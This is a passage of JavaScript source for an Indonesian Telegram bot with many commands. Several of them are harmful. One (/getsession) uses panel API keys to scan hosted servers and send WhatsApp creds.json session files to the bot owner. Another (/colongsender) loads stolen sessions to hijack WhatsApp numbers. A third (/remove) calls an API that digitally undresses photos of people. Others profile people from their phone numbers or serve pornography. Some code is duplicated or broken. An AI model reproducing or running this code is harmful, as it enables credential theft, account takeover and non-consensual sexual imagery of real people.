      "https://files.catbox.moe/1a8fa3.mp4",
      "https://files.catbox.moe/w76gnq.mp4",
      "https://files.catbox.moe/vxhall.mp4",
      "https://files.catbox.moe/u2ktga.mp4"
    ];

    // ============ KIRIM PESAN "SABAR" DULU ============
    await ctx.reply("⏳ Sabar ya, lagi ngambil video random...");
    // ==================================================

    const randomIndex = Math.floor(Math.random() * videoList.length);
    const randomVideo = videoList[randomIndex];

    await ctx.replyWithVideo(randomVideo, {
      caption: `🤤 NIH BOKEP`
    });

  } catch (error) {
    console.error("Error videorandom:", error);
    ctx.reply("❌ Gagal mengambil video random.");
  }
});

bot.command('openfile', checkPremium, async (ctx) => {
  try {
    // CEK HARUS REPLY KE FILE
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
      return ctx.reply('❌ Reply ke file yang mau dibuka!', { 
        reply_to_message_id: ctx.message.message_id 
      });
    }

    const document = ctx.message.reply_to_message.document;
    const fileId = document.file_id;
    const fileName = document.file_name || 'unknown.txt';
    const fileSize = document.file_size || 0;

    // BATAS UKURAN FILE (MAX 1MB)
    if (fileSize > 1024 * 1024) {
      return ctx.reply('❌ File terlalu besar! Maksimal 1MB.');
    }

    await ctx.reply(`📂 Mengambil file *${fileName}*...`, { parse_mode: 'Markdown' });

    // AMBIL LINK FILE
    const fileLink = await ctx.telegram.getFileLink(fileId);
    
    // DOWNLOAD ISI FILE
    const response = await axios.get(fileLink.href, { responseType: 'text' });
    let content = response.data;

    // BATASI PREVIEW
    const maxLength = 3800;
    if (content.length > maxLength) {
      content = content.slice(0, maxLength) + '\n\n... (file terpotong)';
    }

    // KIRIM HASIL
    const resultText = `
╭─⭓ *ISI FILE* ────
│ 📄 *${fileName}*
│ 📦 *${(fileSize / 1024).toFixed(2)} KB*
╰───────────────⭓

\`\`\`javascript
${content}
\`\`\`
`;

    await ctx.reply(resultText, { parse_mode: 'Markdown' });

  } catch (error) {
    console.error("Error openfile:", error.message);
    ctx.reply(`❌ Gagal membaca file: ${error.message}`);
  }
});

bot.command("cekfunc", async (ctx) => {
  try {
    if (!ctx.message.reply_to_message) {
      return ctx.reply("🪧 ☇ Reply function JavaScript yang ingin dicek.")
    }

    const text = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption

    if (!text) {
      return ctx.reply("❌ ☇ Pesan yang direply tidak berisi kode.")
    }

    let acorn
    try {
      acorn = require("acorn")
    } catch {
      return ctx.reply("❌ ☇ Module acorn belum terinstall.\nInstall dengan: npm install acorn")
    }

    try {
      acorn.parse(text, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true
      })

      return ctx.reply(`
✅ SYNTAX VALID
━━━━━━━━━━━━━━━
🔎 Tidak ditemukan error syntax.

© FAULET XBLAUD`, { parse_mode: "HTML" })

    } catch (err) {
      const lines = text.split("\n")
      const line = err.loc.line
      const column = err.loc.column

      const start = Math.max(0, line - 3)
      const end = Math.min(lines.length, line + 2)

      const snippet = lines.slice(start, end).map((l, i) => {
        const num = start + i + 1
        return num === line
          ? `👉 ${num} | ${l}`
          : `   ${num} | ${l}`
      }).join("\n")

      return ctx.reply(`
❌ ERROR TERDETEKSI
━━━━━━━━━━━━━━━
📌 ${err.message}
📍 Line ${line}:${column}

📋 Cuplikan:
\`\`\`javascript
${snippet}
\`\`\`

© νσι∂ ¢яαѕнєя`, { parse_mode: "HTML" })
    }

  } catch (e) {
    console.error(e)
    ctx.reply("❌ ☇ Terjadi error saat mengecek function.")
  }
})

bot.command('tofotolive', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args.length < 2) {
      return ctx.reply(`
❌ FORMAT SALAH
━━━━━━━━━━━━━━━
Gunakan format:
<code>/tofotolive &lt;videoUrl&gt; &lt;audioUrl&gt; [fade]</code>

Contoh:
<code>/tofotolive https://.../video.mp4 https://.../audio.mp3 0.5</code>
`, { parse_mode: "HTML" });
    }

    const [videoUrl, audioUrl, fade] = args;
    const statusMessage = await ctx.reply('⏳ Sedang memproses, harap tunggu...');

    let apiUrl = `https://shynne-apis.vercel.app/tools/livephoto?videoUrl=${encodeURIComponent(videoUrl)}&audioUrl=${encodeURIComponent(audioUrl)}`;
    if (fade) {
      apiUrl += `&fade=${fade}`;
    }

    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer'
    });
    
    await ctx.replyWithDocument({
      source: Buffer.from(response.data),
      filename: 'livephoto.mov'
    }, {
      caption: '✅ Foto Live berhasil dibuat!'
    });

    await ctx.deleteMessage(statusMessage.message_id);

  } catch (error) {
    console.error(error);
    await ctx.reply('❌ TERJADI KESALAHAN\n\nGagal membuat foto live. Pastikan link video dan audio valid dan dapat diakses secara publik.');
  }
});

bot.command("getsession", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /getsession https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

     totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("getnsfw", checkPremium, async (ctx) => {
  try {
    const nsfwTypes = [
      "hentai", "ass", "boobs", "paizuri", "thigh",
      "hanal", "hass", "pgif", "4k", "lewdneko", "lewdkitsune"
    ];
    
    const randomType = nsfwTypes[Math.floor(Math.random() * nsfwTypes.length)];

    const res = await fetchJsonHttps(`https://nekobot.xyz/api/image?type=${randomType}`);
    
    if (res && res.message) {
      await ctx.replyWithVideo(res.message, {
        caption: `✅ ☇ Gambar berhasil dibuat`
      });
    } else {
      ctx.reply("❌ ☇ Gagal membuat gambar");
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi kesalahan saat memuat gambar");
  }
});

bot.command("nsfwwaifu", checkPremium, async (ctx) => {
    // Hanya untuk pengguna premium
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'trap', 'blowjob'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply("❌ ☇ Kategori NSFW tidak valid");
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/nsfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ NSFW WAIFU ⎭ ⊰―—═⬡</b></blockquote>🔞 Kategori: ${category}\n\n⚠️ Konten untuk dewasa`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar NSFW");
    }
});

bot.command("waifu", checkPremium, async (ctx) => {
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</b></blockquote>🌸 Kategori: ${category}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
    }
});

bot.command('iqc', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\n/iqc <pesan> <baterai> <operator>\n\nContoh:\n/iphone Halo dunia 87 Telkomsel');
    }

    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
    const battery = args[args.length - 2];       // misal 87
    const carrier = args[args.length - 1];       // misal Telkomsel
    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

    await ctx.reply('⏳ Membuat quoted message gaya iPhone...');

    // 🔗 Build API URL
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    // Ambil hasil gambar dari API
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');

    // Kirim gambar hasil API ke user
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});

bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});

bot.command("waifu", checkPremium, async (ctx) => {
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</b></blockquote>🌸 Kategori: ${category}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
    }
});

bot.command("anime", checkPremium, async (ctx) => {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query) return ctx.reply("👀 ☇ Format: /anime <judul anime>");

    const waitMsg = await ctx.reply("⏳ ☇ Mencari anime...");

    try {
        const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=5`);
        
        if (!response.data.data || response.data.data.length === 0) {
            await ctx.reply("❌ ☇ Anime tidak ditemukan");
            return;
        }

        const anime = response.data.data[0];
        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ ANIME INFO ⎭ ⊰―—═⬡</b></blockquote>
🎬 <b>${anime.title}</b>
${anime.title_japanese ? `📝 ${anime.title_japanese}\n` : ''}
⭐ Rating: ${anime.score || 'N/A'}
📊 Status: ${anime.status}
📅 Episode: ${anime.episodes || 'Ongoing'}
🎭 Type: ${anime.type}
📺 Source: ${anime.source}

📖 <b>Sinopsis:</b>
${anime.synopsis ? anime.synopsis.substring(0, 500) + '...' : 'Tidak tersedia'}

🔗 <a href="${anime.url}">MyAnimeList</a>`;

        await ctx.replyWithVideo(anime.images.jpg.large_image_url, {
            caption: caption,
            parse_mode: "HTML",
            disable_web_page_preview: true
        });

    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mencari anime");
    } finally {
        try { await ctx.deleteMessage(waitMsg.message_id); } catch {}
    }
});


bot.command("cekbiotele", async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    
    if (args.length < 1 && !ctx.message.reply_to_message) {
        return ctx.reply("📝 Format: /cekbio <username|user_id|reply>\nContoh: /cekbio @username\n/cekbio 123456789\n/cekbio [reply user]");
    }

    let targetUser;
    const processMsg = await ctx.reply("⏳ Mengambil informasi bio...");

    try {
        // Determine target user
        if (ctx.message.reply_to_message) {
            targetUser = ctx.message.reply_to_message.from;
        } else if (args[0].startsWith('@')) {
            const username = args[0].slice(1);
            targetUser = await ctx.telegram.getChat(`@${ctx.from.first_name}`);
        } else {
            const userId = parseInt(args[0]);
            if (isNaN(userId)) {
                await ctx.editMessageText("❌ User ID atau username tidak valid", {
                    chat_id: ctx.chat.id,
                    message_id: processMsg.message_id
                });
                return;
            }
            targetUser = await ctx.telegram.getChat(userId);
        }

        // Get user profile photos for avatar
        const profilePhotos = await ctx.telegram.getUserProfilePhotos(targetUser.id, 0, 1);
        
        // Get full user info
        const userInfo = await formatUserBio(targetUser, profilePhotos);

        // Send result
        if (profilePhotos.total_count > 0) {
            const photoFile = await ctx.telegram.getFile(profilePhotos.photos[0][0].file_id);
            const thumbnailUrl = `https://api.telegram.org/file/bot${ctx.telegram.token}/${photoFile.file_path}`;
            
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: userInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }],
                        [{ text: "🔄 Scan Ulang", callback_data: `rescan_bio_${targetUser.id}` }]
                    ]
                }
            });
        } else {
            await ctx.reply(userInfo, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Bio check error:", error);
        await ctx.editMessageText("❌ Gagal mengambil informasi user. Pastikan username/userID valid dan user tidak di-private.", {
            chat_id: ctx.chat.id,
            message_id: processMsg.message_id
        });
    }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
        // Menggunakan Baileys untuk mendapatkan info kontak
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }

        // Mendapatkan detail kontak
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <b>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</b>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

        // Hapus pesan proses
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

bot.command("cekkontak", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekkontak 62×××\nContoh: /cekkontak 628123456789");
    }

    const number = args[1];
    const cleanNumber = number.replace(/[^0-9]/g, '');
    const target = cleanNumber + "@s.whatsapp.net";

    const processMsg = await ctx.reply("⏳ ☇ Memeriksa kontak WhatsApp...");

    try {
        // Cek apakah nomor terdaftar di WhatsApp
        const contactCheck = await sock.onWhatsApp(target);
        
        if (!contactCheck || contactCheck.length === 0) {
            await ctx.editMessageText(
                `❌ ☇ Nomor ${number} tidak terdaftar di WhatsApp`,
                { chat_id: ctx.chat.id, message_id: processMsg.message_id }
            );
            return;
        }

        const contact = contactCheck[0];
        
        // Dapatkan info profil lengkap
        let profilePicture = null;
        let status = null;
        let businessProfile = null;

        try {
            profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        } catch (e) {}

        try {
            status = await sock.fetchStatus(target).catch(() => null);
        } catch (e) {}

        try {
            businessProfile = await sock.getBusinessProfile(target).catch(() => null);
        } catch (e) {}

        // Format hasil
        let contactInfo = `<blockquote><b>⬡═―—⊱ ⎧ WHATSAPP CONTACT INFO ⎭ ⊰―—═⬡</b></blockquote>\n\n`;
        
        contactInfo += `📱 <b>Informasi Kontak</b>\n\n`;
        contactInfo += `🔢 <b>Nomor:</b> +${cleanNumber}\n`;
        contactInfo += `✅ <b>Status WhatsApp:</b> Terdaftar\n`;
        
        if (contact.exists) {
            contactInfo += `🟢 <b>Akun Aktif:</b> Ya\n`;
        }

        if (status) {
            contactInfo += `📝 <b>Status/Bio:</b> ${status.status || 'Tidak ada'}\n`;
            if (status.setAt) {
                contactInfo += `⏰ <b>Status Diubah:</b> ${new Date(status.setAt).toLocaleString('id-ID')}\n`;
            }
        }

        if (businessProfile) {
            contactInfo += `🏢 <b>Akun Bisnis:</b> Ya\n`;
            contactInfo += `📊 <b>Kategori:</b> ${businessProfile.categories?.[0]?.name || 'Tidak diketahui'}\n`;
            contactInfo += `📋 <b>Deskripsi:</b> ${businessProfile.description || 'Tidak ada'}\n`;
            
            if (businessProfile.email) {
                contactInfo += `📧 <b>Email:</b> ${businessProfile.email}\n`;
            }
            if (businessProfile.website) {
                contactInfo += `🌐 <b>Website:</b> ${businessProfile.website}\n`;
            }
            if (businessProfile.address) {
                contactInfo += `📍 <b>Alamat:</b> ${businessProfile.address}\n`;
            }
        }

        contactInfo += `\n🖼 <b>Foto Profil:</b> ${profilePicture ? 'Tersedia' : 'Tidak tersedia'}\n`;
        contactInfo += `📞 <b>Chat:</b> <a href="https://wa.me/${cleanNumber}">Klik di sini</a>\n`;

        // Kirim hasil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "💬 Cek Grup", callback_data: `checkgroups_${cleanNumber}` }]
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "📊 Cek Detail", callback_data: `checkdetail_${cleanNumber}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking contact:", error);
        await ctx.editMessageText(
            `❌ ☇ Gagal memeriksa kontak ${number}\nError: ${error.message}`,
            { chat_id: ctx.chat.id, message_id: processMsg.message_id }
        );
    }
});

bot.command("remove", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ')
  let imageUrl = args || null

  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id
    const fileLink = await ctx.telegram.getFileLink(fileId)
    imageUrl = fileLink.href
  }

  if (!imageUrl) {
    return ctx.reply('🪧 ☇ Format: /tonaked (reply gambar)')
  }

  const statusMsg = await ctx.reply('⏳ ☇ Memproses gambar')

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`)
    const data = await res.json()
    const hasil = data.result

    if (!hasil) {
      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid')
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id)
    await ctx.replyWithPhoto(hasil)

  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar')
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });
  
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
